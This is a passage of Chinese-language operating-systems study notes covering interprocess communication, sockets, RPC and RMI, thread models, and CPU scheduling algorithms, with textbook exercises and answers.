最多只能有n个消息驻留其中。如果在发送新消息时队列未满，那么该消息可以放在队列中（或者复制消息或者保存消息的指针），且发送者可继续执行而不必等待。不过， 线路容量有限。如果线路满， 必须阻塞发送者直到队列中的空间可用为止。</li><li>无限容量：队列长度可以无限，因此， 不管多少消息都可在其中等待， 从不阻塞发送者。</li></ul><p>零容量情况称为没有缓冲的消息系统， 其他情况称为自动缓冲。</p></li></ol><h2 id="35-客户机服务器系统通信"><a class="markdownIt-Anchor" href="#35-客户机服务器系统通信"></a> 3.5 客户机服务器系统通信</h2><h3 id="351-socket"><a class="markdownIt-Anchor" href="#351-socket"></a> 3.5.1 Socket</h3><p><strong>Socket</strong> （套接字〉可定义为通信的端点。一对通过网络通信的进程需要使用一对Socket一一即每个进程各有一个。</p><p>Socket 由IP 地址与一个端口号连接组成。通常， Socket采用客户机一服务器结构。服务器通过监昕指定端口来等待进来的客户请求。一旦收到请求，服务器就接受来自客户Socket 的连接， 从而完成连接。</p><p>Java提供了三种不同类型的Socket。</p><ul><li>面向连接（TCP) Socket是用Socket类实现的。</li><li>无连接（UDP) Socket 使用了DatagramSocket 类。</li><li>最后一种类型是多点传送Socket 类(MulticastSocket class）， 它是DatagramSocket类的子类。多点传送Socket允许数据发送给多个接收者。</li></ul><p><img src="/posts/8ce3e425/image-20211114161059376.png" alt="image-20211114161059376"></p><p><img src="/posts/8ce3e425/image-20211114161112895.png" alt="image-20211114161112895"></p><p>无论一个Socket通信程序的功能多么齐全、程序多么复杂，其基本结构都是一样的，都包括以下四个基本步骤：</p><ol><li>在客户方和服务器方创建Socket/ServerSocket实例。</li><li>打开连接到Socket的输入/输出流。</li><li>利用输入/输出流，按照一定的协议对Socket进行读/写操作。</li><li>关闭输入/输出流和Socket。//如果网络的一端已经关闭，另一端读到null</li></ol><p>通常，程序员的主要工作是针对所要完成的功能在第3步进行编程，第1、2、4步对所有的通信程序来说几乎都是一样的。</p><p>有连接：</p><p><img src="/posts/8ce3e425/image-20211114162712864.png" alt="image-20211114162712864"></p><p>无连接：</p><p><img src="/posts/8ce3e425/image-20211114162726368.png" alt="image-20211114162726368"></p><h3 id="352-远程过程调用"><a class="markdownIt-Anchor" href="#352-远程过程调用"></a> 3.5.2 远程过程调用</h3><p><img src="/posts/8ce3e425/image-20211114162954112.png" alt="image-20211114162954112"></p><h3 id="353-远程方法调用"><a class="markdownIt-Anchor" href="#353-远程方法调用"></a> 3.5.3 远程方法调用</h3><p>远程方法调用（remote method invocation, RMI） 是一个类似于RPC 的Java 特性。RMI允许线程调用远程对象的方法。如果对象位于不同的JVM 上，那么就认为它是远程的。因此， 远程可能在同一计算机或通过网络连接的主机的不同JVM 上。这种情况如图3.22所示。</p><p><img src="/posts/8ce3e425/image-20211114163017447-16417053527271.png" alt></p><h2 id="36-小结"><a class="markdownIt-Anchor" href="#36-小结"></a> 3.6 小结</h2><p>进程是执行中的程序。随着进程的执行， 它改变状态。进程状态由进程当前活动所定义。每个进程可处于： <strong>新的、就绪、运行、等待或终止</strong>等状态。每个进程在操作系统内通过自己的**进程控制块（PCB）**来表示。</p><p>当前不在执行的进程会放在某个等待队列中。操作系统有两种主要队列：<strong>I/O请求队列</strong>和<strong>就绪队列</strong>。就绪队列包括所有准备执行并等待CPU的进程。每个进程都有PCB , PCB链接起来就形成了就绪队列。长期（作业）调度通过选择进程来争用CPU。通常， <strong>长期调度</strong>会受资源分配考虑， 尤其是内存管理的影响。<strong>短期调度</strong>从就绪队列中选择进程。操作系统必须为父进程创建子进程提供一种机制。父进程在继续之前可以等待它的子进程终止， 也可以并发执行父进程和子进程。并发执行有许多优点， 例如信息共享、提高运算速度、模块化和便利性等。</p><p>操作系统的执行进程可以是独立进程或协作进程。协作进程需要进程间有互相通信的机制。主要有两种形式的通信： <strong>共享内存和消息系统</strong>。共享内存方法要求通信进程共享一些变量。进程通过使用这些共享变量来交换信息。对于<strong>共享内存系统</strong>， 主要由应用程序员提供通信， 操作系统只需要提供共享内存。<strong>消息系统方法</strong>允许进程交换信息。提供通信的主要责任在于操作系统本身。这两种方法并不互相排斥， 能在同一操作系统内同时实现。</p><p>客户机一服务器系统中的通信可能使用：</p><p>(1) <strong>Socket</strong>,(2) <strong>远程过程调用(RPC)</strong>,(3) <strong>Java的远程方法调用（RMI）</strong>。</p><p>Socket定义为通信的端点。一对应用程序间的连接由一对Socket组成，每端各有一个通信频道。RPC 是另一种形式的分布式通信。当一个进程（或线程） 调用一个远程应用的方法时， 就出现了RPC。RMI是RPC 的Java版。RMI允许线程如同调用本地对象一样来调用远程对象的方法。RPC 和RMI的主要区别是RPC传递给远程过程的数据是按普通数据结构形式的， 而RMI允许把对象传递给远程方法。</p><h2 id="37-习题"><a class="markdownIt-Anchor" href="#37-习题"></a> 3.7 习题</h2><p><strong>1.什么是多道程序的度（degree of multiprogramming），它的上限由哪些因素确定？</strong></p><blockquote><p>多道即计算机内存中同时存放几道相互独立的程序。多道程序的度就是操作系统将多少个进程放入了内存。上限的限制因素有CPU的核数、所采用的的调度算法、内存的大小等。</p></blockquote><p><strong>3.1 论述长期、中期、短期调度之间的区别。</strong></p><blockquote><p>a.<strong>短期调度</strong>：从准备执行的进程中选择进程， 并为之分配CPU。<br>b.<strong>中期调度</strong>：作为一种中等程度的调度程序，尤其被用于分时系统，一个交换方案的实施，将部分运行程序移出内存，之后，从中断处继续执行。<br>c.<strong>长期调度</strong>（作业调度程序）：通常对于批处理系统， 进程更多地是被提交， 而不是马上执行。这些进程被放到大容量存储设备（通常为磁盘）的缓冲池中，保存在那里以便以后执行。长期调度程序从缓冲池中选择进程， 并装入内存以准备执行。</p><p>它们主要的<strong>不同之处</strong>是它们的执行的频率。短期调度必须经常调用一个新进程，由于在系统中，长期调度处理移动的作业时，并不频繁被调用，可能在进程离开系统时才被唤起。</p></blockquote><p><strong>3.2 描述内核在两个进程间进行上下文切换的过程。</strong></p><blockquote><p>进程上下文是由进程的PCB来表示的，它包括CPU寄存器的值和内存管理信息等。</p><p>通常，通过执行一个状态保存（ state save） 来保存CPU当前状态（不管它是内核模式还是用户模式）， 之后执行一个状态恢复（ state restore）重新开始运行。</p><p>当发生上下文切换时， 内核会将旧进程的状态保存在其PCB中，然后装入经调度要执行的并己保存的新进程的上下文</p></blockquote><p><strong>3.5 下面设计的好处和坏处分别是什么？系统层次和用户层次都要考虑到</strong>．<br>A，对称和非对称通信</p><p>B，自动和显式缓冲</p><p>C， 复制发送和引用发送</p><p>D，固定大小和可变大小消息</p><blockquote><p>a、 对称和非对称通信——对称通信的一个好处是它允许发送者和接收者之间会合。阻塞发送的一个缺点是可能不需要集合，并且消息可以异步传递；在发送方不感兴趣的点接收。因此，消息传递系统通常提供两种形式的同步<br>b、 自动和显式缓冲自动缓冲提供了一个无限长的队列：因此确保发送方在等待复制消息时不必阻塞。没有关于如何提供自动缓冲的规范：一种方案可能会在浪费大量内存的地方保留足够大的内存。显式缓冲指定缓冲区的大小。在这种情况下，发送方在等待队列中的可用空间时可能会被阻止。但是，显式缓冲不太可能浪费内存<br>c、 按副本发送和按引用发送按副本发送不允许接收方更改参数的状态；“通过引用发送”不允许这样做。通过引用senid的一个好处是，它允许程序员编写集中式应用程序的分布式版本。javasrmi提供了这两种方法，但是通过引用传递参数也需要将参数声明为远程对象。</p></blockquote><h1 id="第4章-线程"><a class="markdownIt-Anchor" href="#第4章-线程"></a> 第4章 线程</h1><h2 id="41-概述"><a class="markdownIt-Anchor" href="#41-概述"></a> 4.1 概述</h2><p>线程是CPU使用的基本单元， 它由<strong>线程ID、程序计数器、寄存器集合和栈</strong>组成。它与属于同一进程的其他线程<strong>共享代码段、数据段和其他操作系统资源</strong>，如打开文件和信号。</p><p>线程是CPU使用的基本单位。</p><p>一个传统重量级（ heavyweight ）的进程只有单个控制线程。如果进程有多个控制线程， 那么它能同时做多个任务。图4.1 说明了传统单线程进程和多线程进程的差别。</p><p><img src="/posts/8ce3e425/image-20211114231912641.png" alt="image-20211114231912641"></p><p><img src="/posts/8ce3e425/image-20220109131221489.png" alt="image-20220109131221489"></p><h3 id="411-动机"><a class="markdownIt-Anchor" href="#411-动机"></a> 4.1.1 动机</h3><h3 id="412-优点"><a class="markdownIt-Anchor" href="#412-优点"></a> 4.1.2 优点</h3><p>多线程编程具有如下4个优点：</p><p>①<strong>响应度高：</strong> 如果对一个交互程序采用多线程， 那么即使其部分阻塞或执行较冗长的操作，该程序仍能继续执行，从而增加了对用户的响应程度。例如，多线程Web浏览器在用一个线程装入图像时，能通过另一个线程与用户交互。</p><p>②<strong>资源共享：</strong> 线程默认共享它们所属进程的内存和资源。代码和数据共享的优点是它能允许一个应用程序在同一地址空间有多个不同的活动线程。</p><p>③<strong>经济：</strong> 进程创建所需要的内存和资源的分配比较昂贵。由于线程能共享它们所属进程的资源，所以创建和切换线程会更为经济。</p><p>④<strong>多处理器体系结构的利用：</strong> 多线程的优点之一是能充分使用多处理器体系结构，以便每个进程能并行运行在不同的处理器上。不管有多少CPU， 单线程进程只能运行在一个CPU上。在多CPU上使用多线程加强了并发功能。</p><h3 id="413-线程与进程的比较"><a class="markdownIt-Anchor" href="#413-线程与进程的比较"></a> 4.1.3 线程与进程的比较</h3><ol><li>调度<ul><li>同一进程的多线程间调度时，不引起进程的切换</li><li>不同进程的线程间调度，需要进程切换<ul><li>线程上下文切换和进程上下问切换一个<strong>最主要的区别</strong>是线程的切换虚拟内存空间依然是相同的，但是进程切换是不同的。因此，进程切换需要切换页目录以使用新的地址空间。而线程切换不需要，</li></ul></li></ul></li><li>并发性<br>一个进程的多个线程之间可并发执行</li><li>资源的拥有<br>线程不拥有系统资源，不拥有代码段、数据段。</li></ol><h3 id="414-线程状态图"><a class="markdownIt-Anchor" href="#414-线程状态图"></a> 4.1.4 线程状态图</h3><p><img src="/posts/8ce3e425/image-20220109131828395.png" alt="image-20220109131828395"></p><h2 id="42-多线程模型"><a class="markdownIt-Anchor" href="#42-多线程模型"></a> 4.2 多线程模型</h2><p>有两种不同方法来提供线程支持： 用户层的<strong>用户线程</strong>或内核层的<strong>内核线程</strong>。</p><p>用户线程受内核支持， 而无须内核管理： 而内核线程由操作系统直接支持和管理。</p><h3 id="421-多对一模型"><a class="markdownIt-Anchor" href="#421-多对一模型"></a> 4.2.1 多对一模型</h3><p>多对一模型（见图4.2 ）将许多用户级线程映射到一个内核线程。</p><p><strong>优点</strong>：</p><ul><li>线程管理是由线程库在用户空间进行的， 因而效率比较高。</li></ul><p><strong>缺点</strong>：</p><ul><li><p>但是如果一个线程执行了阻塞系统调用，那么整个进程会阻塞。</p></li><li><p>而且， 因为任一时刻只有一个线程能访问内核， 多个线程不能并行运行在多处理器上。</p></li></ul><p><img src="/posts/8ce3e425/image-20211114232532605.png" alt="image-20211114232532605"></p><h3 id="422-一对一模型"><a class="markdownIt-Anchor" href="#422-一对一模型"></a> 4.2.2 一对一模型</h3><p>一对一模型（见图4.3） 将每个用户线程映射到一个内核线程。</p><p><strong>优点</strong>：</p><ul><li>该模型在一个线程执行阻塞系统调用时， 能允许另一个线程继续执行， 所以它提供了比多对一模型更好的并发功能；</li><li>它也允许多个线程能并行地运行在多处理器系统上。</li></ul><p>这种模型的唯一<strong>缺点</strong>是：</p><ul><li>每创建一个用户线程就需要创建一个相应的内核线程。由于创建内核线程的开销会影响应用程序的性能， 所以这种模型的绝大多数实现限制了系统所支持的线程数</li></ul><p><img src="/posts/8ce3e425/image-20211114232838467.png" alt="image-20211114232838467"></p><h3 id="423-多对多模型"><a class="markdownIt-Anchor" href="#423-多对多模型"></a> 4.2.3 多对多模型</h3><p>多对多模型（见图4.4） 多路复用了许多用户线程到同样数量或更小数量的内核线程上。内核线程的数量可能与特定应用程序或特定机器有关（位于多处理器上的应用程序可比单处理器上分配更多数量的内核线程）。</p><p>虽然多对一模型允许开发人员创建任意多的用户线程， 但是因为内核只能一次调度一个线程， 所以并没有增加并发性。一对一模型提供了更大的并发性， 但是开发人员必须小心， 不要在应用程序内创建太多的线程（有时可能会限制创建线程的数量）。</p><p>多对多模型没有这两者的缺点：</p><ul><li><p>开发人员可创建任意多的用户线程，并且相应内核线程能在多处理器系统上并发执行。</p></li><li><p>而且，当一个线程执行阻塞系统调用时，内核能调度另一个线程来执行。</p></li></ul><p>一个流行的多对多模型的变种仍然多路复用了许多用户线程到同样数量或更小数量的内核线程上， 但也允许将一个用户线程绑定到某个内核线程上。这个变种有时被称为二级模型（见图4.5）</p><p><img src="/posts/8ce3e425/image-20211114233616173.png" alt="image-20211114233616173"></p><h2 id="43-线程库"><a class="markdownIt-Anchor" href="#43-线程库"></a> 4.3 线程库</h2><p>线程库为程序员提供创建和管理线程的API。</p><p>主要有两种方法来实现线程库。</p><ul><li>第一种方法是在用户空间中提供一个没有内核支持的库， 此库的所有代码和数据结构都存在于用户空间中。调用库中的一个函数只是导致了用户空间中的一个本地函数调用， 而不是系统调用。</li><li>第二种方法是执行一个由操作系统直接支持的内核级的库。此时，库的代码和数据结构存在于内核空间中。调用库中的一个API 函数通常会导致对内核的系统调用。</li></ul><h2 id="47-习题"><a class="markdownIt-Anchor" href="#47-习题"></a> 4.7 习题</h2><p><strong>4.1 举两个多线程程序设计的例子， 其中多线程的性能比单线程的性能差。</strong></p><p><strong>4.2 描述线程库进行用户级线程上下文切换的过程所采取的措施。</strong></p><blockquote><p>用户线程之间的上下文切换与内核线程之间的切换非常相似，尽管它取决于线程库以及它如何将用户线程映射到内核线程。一般来说，用户线程之间的上下文切换涉及获取其LWP的一个用户线程并用另一个线程替换它。此操作通常涉及保存和恢复寄存器的状态。</p></blockquote><p><strong>4.3 在什么环境中， 采用多内核线程的多线程方法比单处理器系统的单线程提供更好的性能？</strong></p><blockquote><p>当一个内核线程出现页面错误时，可以切换另一个内核线程，以一种有用的方式使用交织时间。</p><p>另一方面，当发生页面错误时，单线程进程将无法执行有用的工作。因此，在程序可能经常出现页面错误或必须等待其他系统事件的情况下，多线程解决方案甚至在单处理器系统上也会表现得更好</p></blockquote><p><strong>4.4 在多线程进程中， 下列哪些程序状态组成被共享？</strong><br><strong>a. 寄存器值</strong><br><strong>b. 堆内存</strong><br><strong>c. 全局变量</strong><br><strong>d. 栈内存</strong></p><blockquote><p>一个线程程序的线程共享<strong>堆内存</strong>和<strong>全局变量</strong>，但每个线程都有属于自己的一组<strong>寄存器值</strong>和<strong>栈内存</strong>。</p></blockquote><p><strong>4.5 使用多用户线程的多线程解决方案，在多处理器系统中可以比在单处理器系统中获得更好的性能吗？</strong></p><blockquote><p>一个包括多用户线程的多线程系统无法在多处理系统上同时使用不同的处理器。操作系统只能看到一个单一的进程且不会调度在不同处理器的不同进程的线程。<br>因此， 多处理器系统执行多个用户线程是没有性能优势的。</p></blockquote><p><strong>4.6 如4.5.2小节所介绍，Linux并不区分进程和线程，而是将两者同样对待，将一个任务视为进程或线程， 这取决于传递给clone（）系统调用的标志集。然而， 许多操作系统， 如Windows XP和Solaris,对待进程和线程是不一样的。通常， 这类系统使用标记， 其中进程的数据结构中包含指向属于进程的不同线程。试在内核中比较这两种对进程和线程建模的方法。</strong></p><h1 id="第5章-cpu调度"><a class="markdownIt-Anchor" href="#第5章-cpu调度"></a> 第5章 CPU调度</h1><h2 id="51-基本概念"><a class="markdownIt-Anchor" href="#51-基本概念"></a> 5.1 基本概念</h2><p>多道程序的目标是在任何时候都有某些进程在运行，以使CPU使用率最大化。多道程序的思想较为简单。进程执行直到它必须等待， 通常等待某些I/O请求的完成。</p><p>当一个进程必须等待时， 操作系统会从该进程拿走CPU 的使用权，·而将CPU交给其他进程， 如此继续。在该进程必须等待的时间内，另一个进程就可以拿走CPU的使用权。</p><h3 id="511-cpu-io区间周期"><a class="markdownIt-Anchor" href="#511-cpu-io区间周期"></a> 5.1.1 CPU-I/O区间周期</h3><p>CPU的成功调度依赖于进程的如下属性：进程执行由CPU执行和I/O等待周期组成。进程在这两个状态之间切换。</p><h3 id="512-cpu调度程序"><a class="markdownIt-Anchor" href="#512-cpu调度程序"></a> 5.1.2 CPU调度程序</h3><p>每当CPU空闲时，操作系统就必须从就绪队列中选择一个进程来执行。进程选择由短期调度程序（ short-termscheduler）或CPU调度程序执行。调度程序从内存中选择一个能够执行的进程，并为之分配CPU。</p><h3 id="513-抢占调度"><a class="markdownIt-Anchor" href="#513-抢占调度"></a> 5.1.3 抢占调度</h3><p>CPU调度决策可在如下4种环境下发生：</p><ul><li>当一个进程从运行状态切换到等待状态（例如，I/O请求，或调用wait等待一个子进程的终止〉。</li><li>当一个进程从运行状态切换到就绪状态（例如， 当出现中断时）。</li><li>当一个进程从等待状态切换到就绪状态（例如，I/O完成）。</li><li>当一个进程终止时。</li></ul><p>对于第1 和第4 两种情况， 没有选择而只有调度。一个新进程（如果就绪队列中已有一个进程存在〉必须被选择执行。不过， 对于第2 和第3 两种情况， 可以进行选择。</p><p>当调度只能发生在第1 和第4 两种情况下时，称调度方案是<strong>非抢占的</strong>（ nonpreemptive)的或协作的（ cooperative）：否则， 称调度方案是<strong>抢占的</strong>（preemptive）。采用非抢占调度，一旦CPU 分配给一个进程，那么该进程会一直使用CPU 直到进程终止或切换到等待状态。</p><h3 id="514-分派程序"><a class="markdownIt-Anchor" href="#514-分派程序"></a> 5.1.4 分派程序</h3><p>分派程序是一个模块，用来将CPU 的控制交给由短期调度程序选择的进程。其功能包括：</p><ul><li>切换上下文。</li><li>切换到用户模式。</li><li>跳转到用户程序的合适位置， 以重新启动程序。</li></ul><p>分派程序应尽可能快， 因为在每次进程切换时都要使用。分派程序停止一个进程而启动另一个所要花的时间称为分派延迟（dispatch latency）。</p><h2 id="52-调度准则"><a class="markdownIt-Anchor" href="#52-调度准则"></a> 5.2 调度准则</h2><ul><li><strong>CPU 使用率</strong>： 需要使CPU 尽可能忙。从概念上讲， CPU 使用率从0%～100%。对于真实系统， 它应从40% C轻负荷系统）～90%（重负荷系统）。</li><li><strong>吞吐量</strong>：如果CPU 忙于执行进程，那么就有工作在完成。一种测量工作量的方法称为在吞吐量， 它指一个时间单元内所完成进程的数量。对于长进程，吞吐量可能为每小时一个进程：对于短进程， 吞吐量可能为每秒10 个进程。</li><li><strong>周转时间</strong>：从一个特定进程的角度来看， 一个重要准则是运行该进程需要多长时间。从进程提交到进程完成的时间段称为周转时间。周转时间为所有时间段之和， 包括等待进入内存、在就绪队列中等待、在CPU 上执行和I/O执行。</li><li><strong>等待时间</strong>： CPU 调度算法并不影响进程运行和执行I/O的时间： 它只影响进程在就绪队列中等待所花的时间。等待时间为在就绪队列中等待所花费时间之和。</li><li><strong>响应时间</strong>： 对于交互系统， 周转时间并不是最佳准则。通常， 进程能相当早就产生输出， 并继续计算新结果同时输出以前的结果给用户。因此， 另一时间是从提交请求到产生第一响应的时间。这种时间称为响应时间， 是开始响应所需要的时间， 而不是输出响应所需要的时间。周转时间通常受输出设备速度的限制。</li></ul><p>需要使CPU 使用率和吞吐量最大化，而使周转时间、等待时间和响应时间最小化。</p><h2 id="53-调度算法"><a class="markdownIt-Anchor" href="#53-调度算法"></a> 5.3 调度算法</h2><h3 id="531-先到先服务调度fcfs"><a class="markdownIt-Anchor" href="#531-先到先服务调度fcfs"></a> 5.3.1 先到先服务调度（FCFS）</h3><p><strong>first-come，first-served</strong></p><p>先请求CPU 的进程先分配到CPU。</p><p>FCFS是非抢占的</p><p><img src="/posts/8ce3e425/image-20211103111439645.png" alt="image-20211103111439645"></p><h3 id="532-最短作业优先调度sjf"><a class="markdownIt-Anchor" href="#532-最短作业优先调度sjf"></a> 5.3.2 最短作业优先调度(SJF)</h3><p><strong>shortest job-first (SJF) scheduling algorithm</strong></p><p>这一算法将每个进程与其下一个CPU 区间段相关联。当CPU 为空闲时，它会赋给具有最短CPU 区间的进程。</p><p><img src="/posts/8ce3e425/image-20211103112112804.png" alt="image-20211103112112804"></p><p>SJF 调度算法可证明为最佳的， 这是因为对于给定的一组进程， SJF 算法的平均等待时间最小。</p><p>SJF调度经常用于长期调度。</p><p>对于短期调度，一种方法是使用近似SJF调度，虽然不知道下一个CPU区间的长度，但是可以预测它。认为下一个CPU区间的长度与以前的相似。下一个CPU区间通常可预测为以前CPU区间的测量长度的指数平均。</p><p>SJF 算法可能是抢占的或非抢占的。</p><p>抢占SJF 调度有时称为<strong>最短剩余时间优先调度</strong>（shortest-remaining-time-first scheduling）。</p><p><img src="/posts/8ce3e425/image-20211103113129077.png" alt="image-20211103113129077"></p><h3 id="533-优先级调度"><a class="markdownIt-Anchor" href="#533-优先级调度"></a> 5.3.3 优先级调度</h3><p><strong>priority scheduling algorithm</strong></p><p>每个进程都有一个优先级与其关联，具有最高优先级的进程会分配到CPU。具有相同优先级的进程按FCFS 顺序调度。SJF 算法属于简单优先级算法，其优先级（p） 为下一个（预测的） CPU 区间的倒数。</p><p><img src="/posts/8ce3e425/image-20211103113523515.png" alt="image-20211103113523515"></p><p>优先调度可以是<strong>抢占的或者非抢占</strong>的。当一个进程到达就绪队列时， 其优先级与当前运行进程的优先级相比较。如果新到达进程的优先级高于当前运行进程的优先级，那么抢占优先级调度算法会抢占CPU。而非抢占优先级调度算法只是将新进程加到就绪队列的头部。</p><p>优先级调度算法的一个主要问题是<strong>无穷阻塞</strong>（indefinite blocking）或饥饿（ starvation）。可以运行但缺乏CPU 的进程可认为是阻塞的，它在等待CPU。优先级调度算法会使某个低优先级进程无穷等待CPU。</p><p>低优先级进程无穷等待问题的解决之一是<strong>老化</strong>（aging）。老化是一种技术，以逐渐增加在系统中等待很长时间的进程的优先级。</p><h3 id="534-轮转法调度rr"><a class="markdownIt-Anchor" href="#534-轮转法调度rr"></a> 5.3.4 轮转法调度(RR)</h3><p>轮转法（round-robin, RR） 调度算法是专门为分时系统设计的。它类似于FCFS 调度，但是增加了抢占以切换进程。定义一个较小时间单元称为时间片（ time quantun, or time slice)。时间片通常为10~100ms。将就绪队列作为循环队列。CPU调度程序循环就绪队列为每个进程分配不超过ー个时间片的CPU。</p><p><img src="/posts/8ce3e425/image-20211103114645373.png" alt="image-20211103114645373"></p><p>RR算法的性能很大程度上依赖于时间片的大小。在极端情况下，如果时间片非常大，那么RR算法与FCFS算法一样，如果时间片很小(如1ms):那么RR算法称为处理器共享。</p><h3 id="535-多级队列调度"><a class="markdownIt-Anchor" href="#535-多级队列调度"></a> 5.3.5 多级队列调度</h3><p><strong>多级队列调度算法</strong>（multilevel queue scheduling algorithm）将就绪队列分成多个独立队列（见图5.6〕。根据进程的属性， 如内存大小、进程优先级、进程类型， 一个进程被永久地分配到一个队列。每个队列有自己的调度算法。例如， 前台进程和后台进程可处于不同队列。前台队列可能采用RR 算法调度， 而后台队列可能采用FCFS 算法调度。</p><p><img src="/posts/8ce3e425/image-20220109135201389.png" alt="image-20220109135201389"></p><p>另外， 队列之间必须有调度， 通常采用固定优先级抢占调度。例如， 前台队列可以比后台队列具有绝对的优先级。且是抢占式的。</p><p>另一种可能是在队列之间划分时间片。每个队列都有一定的CPU时间，这可用于调度队列内的进程。例如， 对于前台－后台队列的例子， 前台队列可以有80%的CPU时间用于在进程之间进行RR调度， 而后台队列可以有20%的CPU时间采用FCFS算法调度进程。</p><p>优点是低调度开销， 缺点是不够灵活</p><h3 id="536-多级反馈队列调度"><a class="markdownIt-Anchor" href="#536-多级反馈队列调度"></a> 5.3.6 多级反馈队列调度</h3><p><strong>多级反馈队列调度算法</strong>（multilevelfeedback queue scheduling a lgorithm）允许进程在队列之间移动。主要思想是根据不同CPU区间的特点以区分进程。如果进程使用过多CPU时间， 那么它会被转移到更低优先级队列。这种方案将I/O约束和交互进程留在更高优先级队列。此外， 在较低优先级队列中等待时间过长的进程会被转移到更高优先级队列。这种形式的老化阻止饥饿的发生。</p><p><img src="/posts/8ce3e425/image-20220109135218552.png" alt="image-20220109135218552"></p><h2 id="54-多处理器调度"><a class="markdownIt-Anchor" href="#54-多处理器调度"></a> 5.4 多处理器调度</h2><h3 id="541-多处理器调度的方法"><a class="markdownIt-Anchor" href="#541-多处理器调度的方法"></a> 5.4.1 多处理器调度的方法</h3><p>一种是种<strong>非对称多处理</strong>（asymmetric multiprocessing）方法。是让一个处理器（主服务器）处理所有的调度决定、I/O处理以及其他系统活动， 其他的处理器只执行用户代码。</p><p>另一种方法是使用<strong>对称多处理</strong>（ symmetric multiprocessing, <strong>SMP</strong>）方法， 即每个处理器自我调度。所有进程可能处于一个共同的就绪队列中， 或每个处理器都有它自己的私有就绪进程队列。无论如何，调度通过每个处理器检查共同就绪队列并选择一个进程来执行。</p><h3 id="542-处理器亲和性"><a class="markdownIt-Anchor" href="#542-处理器亲和性"></a> 5.4.2 处理器亲和性</h3><p>处理器亲和性有几种形式。当一个操作系统具有设法让一个进程保持在同一个处理器上运行的策略， 但不能做任何保证时， 则会出现<strong>软亲和性</strong>（ soft affinity ）。 此时， 进程可能在处理器之间移动。有些系统， 如Linux， 还提供一个支持<strong>硬亲和性</strong>（ hard affinity） 的系统调用， 从而允许进程指定它不允许移至其他处理器上。</p><h3 id="543-负载平衡"><a class="markdownIt-Anchor" href="#543-负载平衡"></a> 5.4.3 负载平衡</h3><h3 id="544-对称多线程"><a class="markdownIt-Anchor" href="#544-对称多线程"></a> 5.4.4 对称多线程</h3><h2 id="55-线程调度"><a class="markdownIt-Anchor" href="#55-线程调度"></a> 5.5 线程调度</h2><h3 id="551-竞争范国"><a class="markdownIt-Anchor" href="#551-竞争范国"></a> 5.5.1 竞争范国</h3><h3 id="552-pthread调度"><a class="markdownIt-Anchor" href="#552-pthread调度"></a> 5.5.2 Pthread调度</h3><h2 id="56-操作系统实例"><a class="markdownIt-Anchor" href="#56-操作系统实例"></a> 5.6 操作系统实例</h2><h3 id="561-实例solaris调度"><a class="markdownIt-Anchor" href="#561-实例solaris调度"></a> 5.6.1 实例：Solaris调度</h3><h3 id="562-实例windows-xp调度"><a class="markdownIt-Anchor" href="#562-实例windows-xp调度"></a> 5.6.2 实例：Windows XP调度</h3><h3 id="563-实例linux调度"><a class="markdownIt-Anchor" href="#563-实例linux调度"></a> 5.6.3 实例：Linux调度</h3><h2 id="57-算法评估"><a class="markdownIt-Anchor" href="#57-算法评估"></a> 5.7 算法评估</h2><h3 id="571-确定模型"><a class="markdownIt-Anchor" href="#571-确定模型"></a> 5.7.1 确定模型</h3><p>一种类型的分析评估是确定模型法（ deterministic modeling）。这种方法采用特殊预先确定的负荷， 计算在给定负荷下每个算法的性能。</p><p>确定模型不但简单而且快速。它给出了数字， 以允许人们对算法进行比较。然而， 它要求输入为精确数字， 而且其答案只适用于这些情况。确定模型的主要用途在于描述调度算法和提供例子。</p><h3 id="572-排队模型"><a class="markdownIt-Anchor" href="#572-排队模型"></a> 5.7.2 排队模型</h3><p>知道了到达率和服务率， 可计算使用率、平均队列长度、平均等待时间等。这种研究称为排队网络分析（queueing-network analysis）。</p><p>作为一个例子， 设n为平均队列长度（不包括正在服务的进程）， w 为队列的平均等待时间，A为新进程到达队列的平均到达率（如每秒三个进程）。那么，在进程等待的W时间内， 则有λ ×w个新进程到达队列。如果系统处于稳定状态， 那么离开队列的进程的数量必须等于到达进程的数量。</p><p>因此，<strong>n ＝ λ × W</strong><br>这一公式称为Little公式。Little 公式特别有用， 因为它适用于任何调度算法和到达分布。</p><h3 id="573-模拟"><a class="markdownIt-Anchor" href="#573-模拟"></a> 5.7.3 模拟</h3><p>为了获得更为精确的调度算法评估， 可使用模拟（simulation）。模拟涉及对计算机系统进行建模。软件数据结构表示系统的主要组成部分。模拟程序有一个变量以表示时钟；当该变量的值增加时， 模拟程序会修改系统状态以反映设备、进程和调度程序的活动。随着模拟程序的执行， 用以表示算法性能的统计数字可以被收集并打印出来。</p><h3 id="574-实现"><a class="markdownIt-Anchor" href="#574-实现"></a> 5.7.4 实现</h3><p>针对评估调度算法， 唯一完全精确的方法是对它进行编程， 将它放在操作系统内， 并观测它如何工作。这一方法将真实算法放入操作系统，然后在真实操作系统内进行评估。</p><h2 id="58-小结"><a class="markdownIt-Anchor" href="#58-小结"></a> 5.8 小结</h2><p>CPU 调度的任务是从就绪队列中选择一个等待进程，并为其分配CPU。CPU由调度程序分配给所选中的进程。</p><p>先到先服务（FCFS）调度是最简单的调度算法，但是它会让短进程等待非常长的进程。</p><p>最短作业优先（ SJF ）调度可证明是最佳的，它提供了最短平均等待时间。实现SJF 调度比较困难，因为预测下一个CPU区间的长度有难度。SJF算法是通用优先级调度算法（将CPU 简单地分配给具有最高优先级的进程〉的特例。优先级和SJF调度会产生饥饿。老化技术可阻止饥饿。</p><p>轮转法（RR）调度对于分时（交互〉系统更为合适。RR调度让就绪队列的第一个进程使用CPU 的q个时间单元，这里q是时间片。在q时间单元之后，如果该进程还没有释放CPU，那么它被抢占并放到就绪队列的尾部。该算法的主要问题是选择时间片。如果时间片太大， 那么RR调度就成了FCFS调度；如果时间片太小， 那么因上下文切换而引起的调度开销就过大。</p><p>FCFS算法是非抢占的，而RR算法是抢占的。SJF和优先级算法可以是抢占的，也可以是非抢占的。</p><p>多级队列调度算法允许多个不同算法用于各种类型的进程。最为常用的模型包括使用眼调度的前台交互队列，以及使用FCFS 调度的后台批处理队列。多级反馈队列调度算法允许进程在队列之间迁移。</p><p>许多当前的计算机系统支持多处理器， 井允许每个处理器独立地调度它自己。通常，每个处理器维护自己的私有进程（或线程）队列， 它们都可以运行。与多处理器调度相关<br>的问题包括处理器亲和性和负载平衡。</p><p>如果操作系统在内核级支持线程， 那么必须调度线程而不是进程来执行。Solaris和Windows XP就是这样的系统， 它们采用抢占的、基于优先级的调度算法， 并支持实时线程。Linux进程调度也使用基于优先级算法， 